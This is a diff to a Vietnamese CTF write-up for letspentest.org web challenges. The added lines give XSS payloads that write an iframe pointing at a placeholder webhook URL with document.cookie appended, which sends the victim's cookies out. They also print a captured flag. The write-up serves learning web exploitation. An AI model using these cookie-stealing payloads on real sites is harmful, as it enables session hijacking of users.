@@ -104,18 +104,19 @@ Flag phần này được giấu ở source để mở phần này ta bấm Ctrl
 ```Flag{Web_Sause_Delicious}```  
 ## Web Exploitation  
 <span style='font-size:100px;'>&#128020;</span>[XSS](http://chal12.web.letspentest.org/)  
-
-
-
-
-
-
+Từ tên bài ta đã biết là dùng XSS để làm bay màu trang web này đây là payload mình dùng để lấy được cookie :
+```<script>
+document.write('<iframe src="<chèn url webhook vào đây>?cookie=' + document.cookie + '" />');
+</script>
+```
+	
+![image](https://user-images.githubusercontent.com/75576279/141602978-9e7c5ecf-2cfb-4cb1-8091-948772d6ad0f.png)  
+	```Flag{10c802c9c6afc26769764b5b986d708a}```  
 <span style='font-size:100px;'>&#128020;</span>[XSS Filter](http://chal15.web.letspentest.org/)  
-
-
-
-
-
+Ok vẫn dùng XSS nhưng đề bài sẽ lọc đi bớt 1 số ký tự nhưng đến khi viết bài này thì web chall sập nên chưa lấy được lại Flag nhưng đại loại payload mình sẽ thêm "nonce"  
+```
+	<script> nonce="matuhn" document.write('<iframe src="<chèn url webhook vào đây>?cookie=' + document.cookie + '" />');</script>
+```     
 <span style='font-size:100px;'>&#128020;</span>[Ét Quy Eo](http://chal13.web.letspentest.org/)
 
 
